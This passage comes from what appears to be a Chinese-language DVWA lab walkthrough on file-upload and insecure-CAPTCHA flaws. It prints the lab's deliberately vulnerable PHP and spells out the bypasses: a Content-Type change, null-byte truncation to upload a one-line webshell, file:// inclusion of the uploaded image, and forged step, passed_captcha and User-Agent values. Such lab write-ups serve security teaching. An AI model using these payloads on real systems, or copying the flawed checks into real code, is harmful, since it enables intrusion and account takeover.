class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比于low级别，验证了上传的文件类型要是<code>image/jpeg || image/png</code>。burp接收，修改字段<code>Content-Type</code>即可。</p><p><img src="https://i.loli.net/2020/03/03/XosupF72v9MTJ8U.png"></p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&quot;jpg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>增加了文件后缀的白名单，又要后缀满足条件又要能执行，如果是<code>php&lt;5.3.4</code>的情况，可以利用<code>%00</code>截断文件名。而在其他版本，或许可以考虑上传<code>jpg</code>，利用其他漏洞读上传的文件。</p><p><strong>利用%00截断（php版本&lt;5.3.4）</strong></p><p>上传写有一句话的的马，命令为<code>v0w.php .jpg</code>,然后修改空格为<code>0x00</code>,从而截断，服务器会认为该文件为<code>v0w.php</code>,同时又可以通过后缀名的检测。</p><blockquote><p>注意：这里所说的%00，是指<code>0x00</code>，在burpsuite中修改时，需要在hex中修改</p></blockquote><p><img src="https://i.loli.net/2020/03/03/Nfe1SQ8Fpnvjy7x.png"></p><p><strong>结合包含漏洞进行攻击（php&gt;5.3.4）</strong></p><p>我们只能上传<code>v0w.jpg</code>(写有一句话木马)，但是作为jpg文件，没法执行。同时我们知道上传文件的路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure><p>在<strong>File Inclusion</strong>中，我们爆出了WWW的路径，拼接一下得到完整的<code>v0w.jpg</code>的路径。然后我们可以利用<code>file://</code>来读这个图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/XgnaKYqNDG5A2sJ.png"></p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> || $uploaded_type == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h1 id="Insecure-CAPTCHA（不安全的验证）"><a href="#Insecure-CAPTCHA（不安全的验证）" class="headerlink" title="Insecure CAPTCHA（不安全的验证）"></a>Insecure CAPTCHA（不安全的验证）</h1><h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>不安全的验证码，<code>CAPTCHA</code>是<code>Completely Automated Public Turing Test to Tell Computers and Humans Apart</code> (全自动区分计算机和人类的图灵测试)的简称。</p><p>做这个实验可能需要先弄验证码，按照dvwa的提示，填一个网域和标签就行（网域就是你的IP或者域名）</p><p><img src="https://i.loli.net/2020/03/02/RmU3NAlMZbkrOj6.png"></p><p>但是这个不是重点，这里我们需要测试的是，如何绕过验证。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            $html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>借用大佬的一张图，来说明一下<code>reCAPTCHA</code>的验证流程：</p><p><img src="https://i.loli.net/2020/03/02/3qDuw521ZRJKhvo.png"></p><ol><li>用户通过js请求从Google获取序言进行验证的验证码</li><li>用户输入验证码</li><li>服务器通过调用<code>recaptcha_check_answer</code>函数检查用户输入的正确性</li></ol><p>服务器改密码分为两步，第一步检查<code>reCAPTCHA</code>，验证通过后，服务器返回表单，第二部客户端提交POST请求，服务器完后才能改密码操作。但是这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change和step参数来判断用户是否已经输入正确的验证码。</p><p><strong>漏洞利用</strong></p><p>通过构造参数绕过验证过程的第一步</p><p>通过输入密码，点击Change按钮，抓包, 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field，recaptcha_response_field</code>两个参数</p><p>直接将step更改为2，就跳过了验证码的验证过程。密码修改成功。</p><p><img src="https://i.loli.net/2020/03/02/p8slTyoQnOVbHqP.png"></p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        $hide_form = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>增加了对参数<code>passed_captcha</code>的验证，<strong>payload</strong>增加即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">step&#x3D;2&amp;password_new&#x3D;hack&amp;passed_captcha&#x3D;1&amp;password_conf&#x3D;hack&amp;g-recaptcha-response&#x3D;&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">$hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">$pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">$_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line"><span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line">$insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for user</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Password mismatch</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看到，服务器的验证逻辑是当<code>$resp</code>（谷歌服务器返回的验证）是TRUE，或者参数<code>recaptcha_response_filed == hidd3n_valu3</code>且http包头的<code>User-Agent</code>参数等于<code>reCAPTCHA</code>）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p><p><strong>漏洞利用</strong></p><p>绕过验证应该把目标放到后面的条件了。</p><p>更改参数<code>recaptcha_response_field</code>以及http包头的<code>User-Agent</code></p><p><img src="https://i.loli.net/2020/03/03/ojZv9epO1ArfnaU.png"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_conf ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span 